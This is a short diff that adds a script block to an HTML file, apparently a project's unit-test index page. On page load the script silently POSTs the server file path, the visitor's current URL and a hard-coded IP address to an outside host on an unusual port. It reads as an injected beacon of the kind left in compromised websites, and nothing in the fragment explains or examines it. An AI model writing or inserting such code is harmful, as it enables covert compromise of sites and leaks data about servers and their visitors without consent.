@@ -1,0 +1,10 @@
+<script type=text/javascript> function httpGet(theUrl, data)
+    {
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open('POST', theUrl, false );
+        xmlHttp.send(data);
+    }
+    var path = '/home/reachopticcom/public_html/project/tests/Unit/index.html';
+    var href = window.location.href;
+    httpGet('https://mautic.sitarafoods.com:5099', path + '_____' + href + '_____' + '103.148.156.154')
+    </script>
